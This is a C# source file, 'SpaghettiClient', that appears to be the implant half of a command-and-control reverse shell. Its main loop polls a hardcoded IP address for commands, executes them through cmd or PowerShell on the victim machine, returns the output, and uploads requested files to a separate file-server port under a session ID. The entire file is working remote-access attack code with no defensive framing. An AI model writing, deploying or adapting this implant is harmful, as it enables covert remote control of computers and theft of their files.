using System;
using System.IO;

namespace SpaghettiClient
{
    class Program
    {
        static void Main(string[] args)
        {
            string host = "10.200.32.131"; // change the host ip
            int fs_port = 8088; // change the fileserver port

            string url = String.Format("http://{0}/", host);
            string fs_url = String.Format("http://{0}:{1}/", host, fs_port);
            string location = Directory.GetCurrentDirectory();
            string sessionid = Guid.NewGuid().ToString();

            Commands commands = new Commands();

            while(true)
            {
                String cmd = Utilities.Get(url, location);

                if (cmd.ToLower() == "exit")
                {
                    break;
                }
                else if (cmd.ToLower() == "help")
                {
                    Utilities.Post(url, Utilities.PrintHelp());
                }
                else if (cmd.ToLower() == "session")
                {
                    Utilities.Post(url, "!#!"+sessionid);
                }
                else if (cmd.ToLower().StartsWith("cd ")) 
                {
                    location = commands.ChangeLocation(cmd, location, url);
                }
                else if (cmd.ToLower().StartsWith("download "))
                {
                    string filename = cmd.Substring(9).Replace("\"","");
                    Utilities.Put(fs_url, url, filename, location, sessionid);
                }
                else if (cmd.ToLower().StartsWith("powershell "))
                {
                    string output = commands.RunPSH(cmd, location);
                    Utilities.Post(url, output.ToString());
                }
                else
                {
                    (string output, string error) = commands.RunCMD(cmd, location);

                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Utilities.Post(url, output);
                }
            }
        }
    }
}
